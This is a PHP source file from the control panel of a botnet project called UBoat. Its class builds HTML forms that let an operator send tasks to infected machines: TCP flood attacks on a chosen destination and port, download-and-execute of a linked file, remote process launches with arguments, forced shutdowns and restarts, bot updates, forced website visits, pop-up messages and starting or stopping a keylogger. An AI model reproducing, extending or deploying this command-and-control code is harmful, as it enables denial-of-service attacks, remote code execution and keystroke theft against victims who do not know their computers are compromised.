<?php

/**
 * This file is part of UBoat - HTTP Botnet Project
 */

class taskslayout
{
    public function tcpFlood()
    {
        echo json_encode('  <h4>Please fill the form.</h4><br>
                <div class="col-lg-5">
                    <input name="params[]" type="text" placeholder="Destination.." class="form-control">
                </div>
                <div class="col-lg-2">
                    <input name="params[]" type="text" placeholder="Port.." class="form-control">
                </div>
                <div class="clearfix"></div>
                <br>
                <div class="col-lg-5">
                    <input name="params[]" type="text" class="form-control" placeholder="Duration (seconds)..">
                </div>
                <div class="col-lg-5">
                    <input name="params[]" type="text" class="form-control" placeholder="Recurrence (packets sent per seconds)..">
                </div>
                ');
    }

    public function Shutdown()
    {
        echo json_encode('
            <input type="hidden" name="params[]" value="shutdown">
        ');
    }

    public function Restart()
    {
        echo json_encode('
            <input type="hidden" name="params[]" value="restart">
        ');
    }

    public function downloadExecute()
    {
        echo json_encode('  <h4>Please enter a file direct link</h4>
                <input type="text" name="params[]" class="form-control url_check" style="width: 50%">');
    }

    public function createRemoteProcess()
    {
        echo json_encode('  <h4>Please enter a file path</h4>
            <div class="col-md-5" style="padding-top: 1px;">
                <input name="params[]" type="text" placeholder="File path..." class="form-control">
            </div>
            <input type="checkbox" class="std_on"><a href="" data-toggle="tooltip" title="Do not check this if you aren\'t sure." style="border-bottom: 1px dotted #000; color: blue">&nbsp;Expect STD output ?</a>
            <br><br>
            <div class="col-md-10">
            <textarea name="params[]" id="code" cols="90" rows="4" placeholder="Arguments..." class="form-control"></textarea>
            </div>
            <div class="clearfix"></div>
            ');
    }

    public function Update()
    {
        echo json_encode('  <h4>Please select a file</h4><br>
            <span class="btn btn-default btn-file">
                Browse <input type="file">
            </span>');
    }

    public function VisitUrl()
    {
        echo json_encode('  <h4>Please enter website url</h4>
            <div class="col-md-10">
            <input name="params[]" class="form-control url_check" placeholder="Https non-supported.">
            </div>');
    }

    public function MessageBox()
    {
        echo json_encode('  <h4>Please fill the messagebox data</h4>
            <div class="col-md-5" style="padding-top: 1px;">
                <input name="params[]" type="text" placeholder="Title" class="form-control">
            </div>
            <br><br>
            <div class="col-md-10">
            <textarea name="params[]" id="code" cols="90" rows="4" placeholder="Message data" class="form-control"></textarea>
            </div>
            <div class="clearfix"></div>
            ');
    }

    public function Keylog()
    {
        echo json_encode('
            <div class="col-lg-12">
            <label>Start/Stop Keylogger.</label>
            </div>
            <input type="hidden" class="key_log" name="params[]" value="start">
            <div class="btn-group col-lg-2" data-toggle="buttons">
              <label class="btn btn-primary active switch-logs-off">
                <input type="radio" autocomplete="off" checked> Off
              </label>
              <label class="btn btn-primary switch-logs-on">
                <input type="radio" id="option2" autocomplete="off"> On
              </label>
            </div>
           ');
    }
}
